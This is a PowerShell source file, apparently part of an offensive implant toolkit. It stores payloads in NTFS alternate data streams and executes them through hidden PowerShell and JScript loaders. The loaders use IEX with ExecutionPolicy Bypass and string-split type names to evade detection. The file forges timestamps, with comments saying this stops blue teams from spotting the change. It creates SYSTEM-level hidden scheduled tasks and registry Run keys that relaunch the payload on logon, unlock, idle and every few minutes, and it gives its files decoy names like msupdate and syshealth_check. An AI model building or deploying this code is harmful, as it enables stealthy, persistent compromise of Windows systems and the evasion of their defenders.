function Write-ADSPayload {
    <#
    .SYNOPSIS
        Writes payload to ADS
    #>
    [CmdletBinding()]
    param(
        [string]$HostPath,
        [string]$StreamName,
        [string]$PayloadContent,
        [switch]$EncryptPayload
    )

    try {
        # Ensure host file exists
        if (-not (Test-Path $HostPath)) {
            New-Item -Path $HostPath -ItemType File -Force | Out-Null
        }

        # Save original timestamps for anti-forensics restoration
        $originalTimestamps = $null
        if (Test-Path $HostPath) {
            $originalTimestamps = Get-Item $HostPath | Select-Object CreationTime, LastWriteTime, LastAccessTime
        }

        # Encrypt if requested (DPAPI — no key param needed)
        $finalPayload = if ($EncryptPayload) {
            Protect-Payload -PlainText $PayloadContent
        } else {
            $PayloadContent
        }

        # Write to ADS
        $adsPath = "$HostPath`:$StreamName"
        $finalPayload | Set-Content -Path $adsPath -Force -ErrorAction SilentlyContinue

        # Post-write verification — never trust silent failures
        $verifyStream = Get-Item $HostPath -Stream $StreamName -ErrorAction SilentlyContinue
        if (-not $verifyStream) {
            Write-Warning "ADS write failed on $HostPath — falling back to safe path"
            # Fallback to a known-writable location
            $fallbackPath = Join-Path $env:ProgramData ("cache_" + [guid]::NewGuid().ToString().Substring(0,8) + ".dat")
            if (-not (Test-Path $fallbackPath)) {
                New-Item -Path $fallbackPath -ItemType File -Force | Out-Null
            }
            $adsPath = "$fallbackPath`:$StreamName"
            $finalPayload | Set-Content -Path $adsPath -Force
            # Verify fallback write
            $verifyFallback = Get-Item $fallbackPath -Stream $StreamName -ErrorAction SilentlyContinue
            if (-not $verifyFallback) {
                Write-Error "ADS write failed on fallback path $fallbackPath"
                return $null
            }
            $HostPath = $fallbackPath
            Write-Verbose "Fallback ADS written to: $adsPath"
        }

        # Restore timestamps — ADS creation modifies LastWriteTime, which
        # creates a forensic artifact in timeline analysis. Restoring prevents
        # blue team from noticing unexpected modification on legitimate files.
        if ($originalTimestamps) {
            $item = Get-Item $HostPath
            $item.CreationTime = $originalTimestamps.CreationTime
            $item.LastWriteTime = $originalTimestamps.LastWriteTime
            $item.LastAccessTime = $originalTimestamps.LastAccessTime
        }

        Write-Verbose "Payload written to: $adsPath"
        return $adsPath
    } catch {
        Write-Error "Failed to write ADS: $_"
        return $null
    }
}

#endregion

#region Persistence

function Build-Loader {
    <#
    .SYNOPSIS
        Generates PowerShell loader for ADS
    #>
    param(
        [string]$HostPath,
        [string]$StreamName,
        [switch]$IsEncrypted
    )

    if ($IsEncrypted) {
        return @"
`$e = Get-Content '$HostPath`:$StreamName' -Raw
`$p = Unprotect-Payload -EncryptedData `$e
IEX `$p
"@
    } else {
        return @"
`$p = Get-Content '$HostPath`:$StreamName' -Raw
IEX `$p
"@
    }
}

function Build-JScriptWrapper {
    <#
    .SYNOPSIS
        Generates JScript source that launches PowerShell completely hidden.

    .PARAMETER ADSFullPath
        Full ADS path including stream, e.g. "C:\ProgramData\file.dat:stream"

    .PARAMETER IsEncrypted
        Embeds decryption functions inline with obfuscated names.

    .PARAMETER GHKName
        Obfuscated name for the host-key derivation function (default: Get-HostKey).

    .PARAMETER DecName
        Obfuscated name for the decryption function (default: Dec).

    .OUTPUTS
        [string]  JScript source code, ASCII-safe.
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory)]
        [string]$ADSFullPath,

        [switch]$IsEncrypted,

        [string]$GHKName = 'Get-HostKey',
        [string]$DecName = 'Dec'
    )

    # Escape backslashes for JScript string context.
    # In .NET:  -replace '\\' matches literal \, replacement '\\' is literal \\.
    # Result: C:\Path -> C:\\Path  (correct for JScript string literals).
    $jsPath = $ADSFullPath -replace '\\', '\\'

    if ($IsEncrypted) {
        # DPAPI inline decryption — no AES/SHA256 class names in the .js file.
        # Type names are string-concatenated so they never appear as plaintext
        # identifiers (same fragmentation technique as the DeflateStream stub).
        # [scriptblock]::Create().Invoke() instead of IEX — already validated clean.
        $template = @'
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
    "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
    "$_e=Get-Content '__ADSPATH__' -Raw;" +
    "$_b=[Convert]::FromBase64String($_e);" +
    "$_g=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -EA 0).MachineGuid;" +
    "$_ent=if($_g){[Text.Encoding]::UTF8.GetBytes($_g)}else{$null};" +
    "$_tp='System.Security.Crypt'+'ography.Prot'+'ectedData';" +
    "$_sc='System.Security.Crypt'+'ography.DataProt'+'ectionScope';" +
    "$_d=([type]$_tp)::Unprotect($_b,$_ent,([type]$_sc)::LocalMachine);" +
    "[scriptblock]::Create([Text.Encoding]::UTF8.GetString($_d)).Invoke()" +
    "\"";
shell.Run(cmd, 0, false);
'@
        return $template.Replace('__ADSPATH__', $jsPath)
    }
    else {
        $template = @'
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
    "IEX(Get-Content '__ADSPATH__' -Raw)" +
    "\"";
shell.Run(cmd, 0, false);
'@
        return $template.Replace('__ADSPATH__', $jsPath)
    }
}

function Create-ScheduledTaskPersistence {
    <#
    .SYNOPSIS
        Creates a scheduled task that executes via a JScript wrapper
        to guarantee zero visible windows.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$HostPath,

        [Parameter(Mandatory)]
        [string]$StreamName,

        [string]$TaskName,

        [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
        [string[]]$Trigger = @('AtLogOn', 'AtStartup'),

        [int]$PeriodicMinutes = 5,
        [int]$JitterPercent = 20,

        [switch]$IsEncrypted,

        [string]$GHKName = 'Get-HostKey',
        [string]$DecName = 'Dec'
    )

    try {
        # --- Task name ---
        if ([string]::IsNullOrEmpty($TaskName)) {
            $TaskName = if ($Randomize) {
                "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
            } else {
                "SystemOptimization"
            }
        }

        # --- Generate JScript wrapper ---
        $adsFullPath = "${HostPath}:${StreamName}"
        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted -GHKName $GHKName -DecName $DecName

        # --- Choose save location (co-locate with host file) ---
        $hostDir = Split-Path $HostPath -Parent
        if (-not $hostDir -or -not (Test-Path $hostDir)) {
            $hostDir = $env:ProgramData
        }

        $jsFileName = if ($Randomize) {
            $prefixes = @('msupdate','windiag','perfmon_report','etw_session','wer_diag','mrt_scan')
            $prefix  = $prefixes | Get-Random
            $suffix  = -join ((48..57) + (97..102) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
            "${prefix}_${suffix}.js"
        } else {
            "syshealth_check.js"
        }

        $jsPath = Join-Path $hostDir $jsFileName

        # --- Write to disk (ASCII — wscript chokes on UTF-8 BOM) ---
        $jsContent | Out-File -FilePath $jsPath -Encoding ASCII -Force
        Write-Verbose "JScript wrapper saved: $jsPath"

        # --- Task action: wscript.exe //B //E:JScript "wrapper.js" ---
        $action = New-ScheduledTaskAction -Execute "wscript.exe" `
            -Argument "//B //E:JScript `"$jsPath`""

        # --- Compute jitter delay as ISO 8601 duration ---
        # Task Scheduler XML requires ISO 8601 strings (PT#M) for both
        # Delay (AtLogOn/AtStartup/OnUnlock) and RandomDelay (periodic) properties.
        # TimeSpan objects serialize to HH:MM:SS which the XML parser rejects.
        $jitterDelayISO = $null
        if ($JitterPercent -gt 0) {
            $jitterMinutes = [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
            $jitterDelayISO = "PT${jitterMinutes}M"
        }

        # --- Build trigger array from all specified triggers ---
        $triggers = @()
        foreach ($t in $Trigger) {
            switch ($t) {
                'AtLogOn' {
                    $tObj = New-ScheduledTaskTrigger -AtLogOn
                    # MSFT_TaskLogonTrigger uses 'Delay' (ISO 8601), not 'RandomDelay'
                    if ($jitterDelayISO) { $tObj.Delay = $jitterDelayISO }
                    $triggers += $tObj
                }
                'AtStartup' {
                    $tObj = New-ScheduledTaskTrigger -AtStartup
                    # MSFT_TaskBootTrigger uses 'Delay' (ISO 8601), not 'RandomDelay'
                    if ($jitterDelayISO) { $tObj.Delay = $jitterDelayISO }
                    $triggers += $tObj
                }
                'OnIdle' {
                    # CIM idle trigger — fires when the system enters idle state
                    # MSFT_TaskIdleTrigger has no delay property; idle duration is in task settings
                    $tObj = New-CimInstance -CimClass (
                        Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
                    ) -ClientOnly
                    $triggers += $tObj
                }
                'OnUnlock' {
                    # CIM session state change — fires every time a user unlocks (cheeky!)
                    # MSFT_TaskSessionStateChangeTrigger uses 'Delay', set during CIM creation
                    $unlockProps = @{ StateChange = [uint32]8 }  # 8 = SessionUnlock (TASK_SESSION_STATE_CHANGE_TYPE)
                    if ($jitterDelayISO) {
                        $unlockProps['Delay'] = $jitterDelayISO
                    }
                    $tObj = New-CimInstance -CimClass (
                        Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
                    ) -Property $unlockProps -ClientOnly
                    $triggers += $tObj
                }
            }
        }

        # Always add periodic trigger for interval execution
        $triggerPeriodic = New-ScheduledTaskTrigger -Once `
            -At (Get-Date).AddMinutes(1) `
            -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) `
            -RepetitionDuration (New-TimeSpan -Days 9999)
        # RandomDelay also requires ISO 8601 string for Task Scheduler XML serialization
        if ($jitterDelayISO) { $triggerPeriodic.RandomDelay = $jitterDelayISO }
        $triggers += $triggerPeriodic

        # --- Task settings (add idle config if OnIdle trigger is present) ---
        $settingsParams = @{
            AllowStartIfOnBatteries    = $true
            DontStopIfGoingOnBatteries = $true
            Hidden                     = $true
        }
        if ($Trigger -contains 'OnIdle') {
            $settingsParams.IdleDuration    = New-TimeSpan -Minutes 10
            $settingsParams.IdleWaitTimeout  = New-TimeSpan -Hours 1
        }
        $settings = New-ScheduledTaskSettingsSet @settingsParams

        $principal = New-ScheduledTaskPrincipal `
            -UserId "SYSTEM" `
            -LogonType ServiceAccount `
            -RunLevel Highest

        Register-ScheduledTask -TaskName $TaskName `
            -Action $action `
            -Trigger $triggers `
            -Settings $settings `
            -Principal $principal `
            -Force | Out-Null

        $triggerSummary = ($Trigger -join '+') + "+Periodic(${PeriodicMinutes}m)"
        if ($JitterPercent -gt 0) { $triggerSummary += "+Jitter(${JitterPercent}%)" }
        Write-Verbose "Scheduled task created: $TaskName ($triggerSummary)"

        return @{
            TaskName          = $TaskName
            JScriptLoaderPath = $jsPath
            TriggerSummary    = $triggerSummary
        }
    }
    catch {
        Write-Error "Task creation failed: $_"
        return $null
    }
}

function Create-RegistryPersistence {
    <#
    .SYNOPSIS
        Creates registry Run key persistence with companion scheduled task.
        Registry Run keys handle logon/startup. A companion task handles
        periodic execution + cheeky triggers (OnIdle, OnUnlock) that
        registry can't do natively.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$HostPath,

        [Parameter(Mandatory)]
        [string]$StreamName,

        [string]$ValueName = 'SystemOptimization',

        [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
        [string[]]$Trigger = @('AtLogOn', 'AtStartup'),

        [int]$PeriodicMinutes = 5,
        [int]$JitterPercent = 20,

        [switch]$IsEncrypted,

        [string]$GHKName = 'GHK',
        [string]$DecName = 'Dec',
        [string]$TaskSuffix = '_Companion'
    )

    try {
        $adsFullPath = "${HostPath}:${StreamName}"

        # Build the registry value command.
        # -W Hidden works from registry Run keys (Explorer.exe respects it).
        # Encrypted: DPAPI inline with fragmented type names — no AES/SHA256 class references.
        if ($IsEncrypted) {
            $regCmd = 'powershell.exe -NoP -W Hidden -EP Bypass -C "' +
                "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
                '$_e=gc ' + "'$adsFullPath'" + ' -Raw;' +
                '$_b=[Convert]::FromBase64String($_e);' +
                '$_g=(Get-ItemProperty ' + "'HKLM:\SOFTWARE\Microsoft\Cryptography'" + ' -EA 0).MachineGuid;' +
                '$_ent=if($_g){[Text.Encoding]::UTF8.GetBytes($_g)}else{$null};' +
                '$_tp=' + "'System.Security.Crypt'+'ography.Prot'+'ectedData'" + ';' +
                '$_sc=' + "'System.Security.Crypt'+'ography.DataProt'+'ectionScope'" + ';' +
                '$_d=([type]$_tp)::Unprotect($_b,$_ent,([type]$_sc)::LocalMachine);' +
                '[scriptblock]::Create([Text.Encoding]::UTF8.GetString($_d)).Invoke()' +
                '"'
        } else {
            $regCmd = "powershell.exe -NoP -W Hidden -EP Bypass -C `"IEX(gc '$adsFullPath' -Raw)`""
        }

        $result = @{
            ValueName      = $ValueName
            Trigger        = $Trigger
            RegistryPaths  = @()
        }

        # --- Write registry Run keys for logon/startup triggers ---
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)

        if ($Trigger -contains 'AtLogOn') {
            $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
            Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
            $result.RegistryPaths += $hkcuPath
            Write-Verbose "Registry Run key (HKCU/logon): $hkcuPath\$ValueName"
        }

        if ($Trigger -contains 'AtStartup') {
            if ($isAdmin) {
                $hklmPath = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
                Set-ItemProperty -Path $hklmPath -Name $ValueName -Value $regCmd -Force
                $result.RegistryPaths += $hklmPath
                Write-Verbose "Registry Run key (HKLM/startup): $hklmPath\$ValueName"
            } else {
                Write-Warning "AtStartup requires admin - writing HKCU instead (fires at logon)"
                if ($result.RegistryPaths -notcontains 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run') {
                    $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
                    Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
                    $result.RegistryPaths += $hkcuPath
                }
            }
        }

        # If no logon/startup triggers, still write HKCU as baseline
        if ($result.RegistryPaths.Count -eq 0) {
            $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
            Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
            $result.RegistryPaths += $hkcuPath
        }

        # --- Companion task for periodic + cheeky triggers ---
        # Registry Run keys only fire at logon/startup. A companion task
        # handles periodic interval, OnIdle, and OnUnlock — consistent
        # with task persistence behavior.
        $companionTaskName = "${ValueName}${TaskSuffix}"

        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted -GHKName $GHKName -DecName $DecName

        $hostDir = Split-Path $HostPath -Parent
        if (-not $hostDir -or -not (Test-Path $hostDir)) { $hostDir = $env:ProgramData }

        $jsFileName = if ($Randomize) {
            $prefixes = @('msupdate','windiag','perfmon_report','etw_session')
            $prefix  = $prefixes | Get-Random
            $suffix  = -join ((48..57) + (97..102) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
            "${prefix}_${suffix}.js"
        } else {
            "syshealth_companion.js"
        }

        $jsPath = Join-Path $hostDir $jsFileName
        $jsContent | Out-File -FilePath $jsPath -Encoding ASCII -Force

        $taskAction = New-ScheduledTaskAction -Execute "wscript.exe" `
            -Argument "//B //E:JScript `"$jsPath`""

        # Build companion triggers (periodic + cheeky)
        $jitterDelayISO = $null
        if ($JitterPercent -gt 0) {
            $jitterMinutes = [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
            $jitterDelayISO = "PT${jitterMinutes}M"
        }

        $taskTriggers = @()
        # Periodic
        $tPeriodic = New-ScheduledTaskTrigger -Once `
            -At (Get-Date).AddMinutes(1) `
            -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) `
            -RepetitionDuration (New-TimeSpan -Days 9999)
        if ($jitterDelayISO) { $tPeriodic.RandomDelay = $jitterDelayISO }
        $taskTriggers += $tPeriodic

        # OnIdle
        if ($Trigger -contains 'OnIdle') {
            $tIdle = New-CimInstance -CimClass (
                Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
            ) -ClientOnly
            $taskTriggers += $tIdle
        }
        # OnUnlock
        if ($Trigger -contains 'OnUnlock') {
            $unlockProps = @{ StateChange = [uint32]8 }
            if ($jitterDelayISO) {
                $unlockProps['Delay'] = $jitterDelayISO
            }
            $tUnlock = New-CimInstance -CimClass (
                Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
            ) -Property $unlockProps -ClientOnly
            $taskTriggers += $tUnlock
        }

        $settingsParams = @{
            AllowStartIfOnBatteries    = $true
            DontStopIfGoingOnBatteries = $true
            Hidden                     = $true
        }
        if ($Trigger -contains 'OnIdle') {
            $settingsParams.IdleDuration   = New-TimeSpan -Minutes 10
            $settingsParams.IdleWaitTimeout = New-TimeSpan -Hours 1
        }
        $taskSettings = New-ScheduledTaskSettingsSet @settingsParams

        $taskPrincipal = New-ScheduledTaskPrincipal `
            -UserId "SYSTEM" `
            -LogonType ServiceAccount `
            -RunLevel Highest

        # SilentlyContinue: companion task requires admin — if not admin, registry Run key
        # still fires at logon; periodic/cheeky triggers just won't be available
        Register-ScheduledTask -TaskName $companionTaskName `
            -Action $taskAction `
            -Trigger $taskTriggers `
            -Settings $taskSettings `
            -Principal $taskPrincipal `
            -Force -ErrorAction SilentlyContinue | Out-Null

        $result.CompanionTaskName  = $companionTaskName
        $result.CompanionJScriptPath = $jsPath

        $triggerSummary = ($Trigger -join '+') + "+Periodic(${PeriodicMinutes}m)"
        if ($JitterPercent -gt 0) { $triggerSummary += "+Jitter(${JitterPercent}%)" }
        Write-Verbose "Registry persistence: $($result.RegistryPaths -join ' + ') + companion task $companionTaskName ($triggerSummary)"

        return $result
    }
    catch {
        Write-Error "Registry persistence failed: $_"
        return $null
    }
}

#endregion

#region Main Execution

# Handle payload input
if ($PayloadAtRuntime -and -not $Payload) {
    Write-Host "Enter payload (press Enter twice when done):" -ForegroundColor Cyan
    $lines = @()
    do {
        $line = Read-Host
        if ($line) { $lines += $line }
    } while ($line)
    $Payload = $lines -join "`n"
}

if (-not $Payload) {
    Write-Error "No payload specified. Use -Payload or -PayloadAtRuntime"
    exit 1
}

# Generate config
$config = Get-RandomADSConfig -UseZeroWidth:$ZeroWidthStreams `
                              -ZwMode $ZeroWidthMode `
                              -ZwPrefix $HybridPrefix `
                              -UseDeepPlacement:$UseDeepPlacement `
                              -AttachToExisting:$AttachToExisting

Write-Verbose "Host: $($config.HostPath)"
Write-Verbose "Stream: $($config.StreamName)"
if ($ZeroWidthStreams) {
    Write-Warning "Zero-width stream - Codepoints: $($config.Codepoints)"
}

# Generate obfuscated names (consistent across all references in this deployment)
$taskName = Get-ObfuscatedName -Type TaskName -Level $Obfuscate
$taskSuffix = Get-ObfuscatedName -Type TaskSuffix -Level $Obfuscate
$ghkFuncName = Get-ObfuscatedName -Type FunctionGHK -Level $Obfuscate
$decFuncName = Get-ObfuscatedName -Type FunctionDec -Level $Obfuscate

# If GenerateOnly mode, return configuration and exit
if ($GenerateOnly) {
    # Convert stream name to escaped format for command generation
    $streamChars = ([string]$config.StreamName).ToCharArray()
    $streamNameEscaped = ($streamChars | ForEach-Object {
        "[char]0x{0:X4}" -f [int]$_
    }) -join '+'

    # Return configuration object
    return [PSCustomObject]@{
        HostPath = $config.HostPath
        StreamName = $config.StreamName
        StreamNameEscaped = $streamNameEscaped
        Codepoints = $config.Codepoints
        TaskName = $taskName
        TaskSuffix = $taskSuffix
        GHKFunctionName = $ghkFuncName
        DecFunctionName = $decFuncName
        Payload = $Payload
        PayloadEncrypted = $Encrypt.IsPresent
        PersistenceMethod = $Persist
        DecoysCount = $CreateDecoys
        ZeroWidthMode = $ZeroWidthMode
        HybridPrefix = $HybridPrefix
        Randomized = [bool]$Randomize
        DeepPlacement = [bool]$UseDeepPlacement
        AttachToExisting = [bool]$AttachToExisting
        Trigger = $Trigger
        PeriodicMinutes = $PeriodicMinutes
        JitterPercent = $JitterPercent
        ObfuscationLevel = $Obfuscate
    }
}

# Normal execution path (not GenerateOnly)
# Create decoys
if ($CreateDecoys -gt 0) {
    Create-DecoyStreams -HostPath $config.HostPath -Count $CreateDecoys
}

# Write payload
$adsPath = Write-ADSPayload -HostPath $config.HostPath `
                            -StreamName $config.StreamName `
                            -PayloadContent $Payload `
                            -EncryptPayload:$Encrypt

if (-not $adsPath) {
    Write-Error "Failed to create ADS"
    exit 1
}

# Create persistence
if ($Persist -ne 'none') {
    switch ($Persist) {
        'task' {
            $taskResult = Create-ScheduledTaskPersistence `
                -HostPath $config.HostPath `
                -StreamName $config.StreamName `
                -TaskName $taskName `
                -Trigger $Trigger `
                -PeriodicMinutes $PeriodicMinutes `
                -JitterPercent $JitterPercent `
                -IsEncrypted:$Encrypt `
                -GHKName $ghkFuncName `
                -DecName $decFuncName

            if ($taskResult) {
                $taskName     = $taskResult.TaskName
                $jsLoaderPath = $taskResult.JScriptLoaderPath
                Write-Host "[+] Persistence: Scheduled Task '$taskName' ($($taskResult.TriggerSummary))" -ForegroundColor Green
                Write-Host "[+] JScript loader: $jsLoaderPath" -ForegroundColor Green
            } else {
                Write-Error "Failed to create scheduled task persistence"
            }
        }
        'registry' {
            $regResult = Create-RegistryPersistence `
                -HostPath $config.HostPath `
                -StreamName $config.StreamName `
                -ValueName $taskName `
                -Trigger $Trigger `
                -PeriodicMinutes $PeriodicMinutes `
                -JitterPercent $JitterPercent `
                -IsEncrypted:$Encrypt `
                -GHKName $ghkFuncName `
                -DecName $decFuncName `
                -TaskSuffix $taskSuffix

            if ($regResult) {
                foreach ($rp in $regResult.RegistryPaths) {
                    Write-Host "[+] Persistence: Registry '$rp\$($regResult.ValueName)'" -ForegroundColor Green
                }
                if ($regResult.CompanionTaskName) {
                    Write-Host "[+] Companion task: $($regResult.CompanionTaskName) (periodic+cheeky triggers)" -ForegroundColor Green
                    Write-Host "[+] JScript loader: $($regResult.CompanionJScriptPath)" -ForegroundColor Green
                    $jsLoaderPath = $regResult.CompanionJScriptPath
                }
            } else {
                Write-Error "Failed to create registry persistence"
            }
        }
    }
}

# Save manifest (Linux only - not on Windows target)
if ($ManifestPath) {
    $payloadHash = (Get-FileHash -InputStream (
        [System.IO.MemoryStream]::new(
            [System.Text.Encoding]::UTF8.GetBytes($Payload)
        )) -Algorithm SHA256).Hash

    $entry = Create-ManifestEntry -TargetHost $env:COMPUTERNAME `
                                  -FilePath $config.HostPath `
                                  -StreamName $config.StreamName `
                                  -PayloadHash $payloadHash `
                                  -PersistenceMethod $Persist

    $entry | Add-Member -NotePropertyName 'Trigger' -NotePropertyValue ($Trigger -join ',')
    $entry | Add-Member -NotePropertyName 'PeriodicMinutes' -NotePropertyValue $PeriodicMinutes
    $entry | Add-Member -NotePropertyName 'JitterPercent' -NotePropertyValue $JitterPercent

    # Append JScript path for cleanup tracking
    if ($jsLoaderPath) {
        $entry | Add-Member -NotePropertyName 'JScriptLoaderPath' `
                            -NotePropertyValue $jsLoaderPath
    }

    # Registry-specific fields
    if ($regResult) {
        $entry | Add-Member -NotePropertyName 'RegistryPaths' -NotePropertyValue ($regResult.RegistryPaths -join ',')
        $entry | Add-Member -NotePropertyName 'RegistryValueName' -NotePropertyValue $regResult.ValueName
        if ($regResult.CompanionTaskName) {
            $entry | Add-Member -NotePropertyName 'CompanionTaskName' -NotePropertyValue $regResult.CompanionTaskName
        }
        if ($regResult.CompanionJScriptPath) {
            $entry | Add-Member -NotePropertyName 'CompanionJScriptPath' -NotePropertyValue $regResult.CompanionJScriptPath
        }
    }

    Save-ManifestToLinux -Entries @($entry) -OutputPath $ManifestPath
    Write-Host "[+] Manifest saved: $ManifestPath" -ForegroundColor Green
}

# Execute
if (-not $NoExec) {
    Write-Verbose "Executing payload..."
    try {
        IEX $Payload
    } catch {
        Write-Error "Execution failed: $_"
    }
}

Write-Host "[+] Deployment complete" -ForegroundColor Green

#endregion
